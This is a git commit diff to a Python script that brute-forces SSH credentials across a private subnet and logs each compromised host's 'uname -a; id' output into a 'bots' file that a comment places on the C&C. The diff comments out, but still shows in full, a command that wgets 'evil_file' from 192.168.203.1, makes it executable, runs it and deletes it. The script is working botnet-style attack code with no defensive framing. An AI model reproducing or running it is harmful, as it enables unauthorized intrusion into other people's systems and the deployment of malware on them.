acd32e217f62e9ba70c2f226e21fb069ff89db29
root <fr3shnuts@gmail.com>
2019-06-20 14:31:42 -0700

    add uname -a, target stdout+stderr to file, formatted

--- new_scan_drop.py
+++ new_scan_drop.py
@@ -27,16 +27,24 @@ num2 = 0
 
 def ssh_start():
     ip = "192.168.203.%d" % i
-#    print "Connecting:", ip, user_list[num] + pass_list[num2]
+	# print "Connecting:", ip, user_list[num] + pass_list[num2]
     p = paramiko.SSHClient()
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 /tmp/evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
+#        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file" -O /tmp ; chmod 755 /tmp/evil_file; /tmp/./evil_file; sleep 1; rm /tmp/evil_file')
+		# print then append target's output into file 'bots' on C&C.
+        stdin, stdout, stderr = p.exec_command('uname -a; id')
+        f = open("bots", "a")
+        f.write("=" * 70 + "\n")
         for line in stdout:
             print(line.strip('\n'))
+            f.write(line)
         for line in stderr:
             print(line.strip('\n'))
+            f.write(line)
+        f.write("=" * 70 + "\n")
+        f.close()
     except paramiko.AuthenticationException:
             pass
 
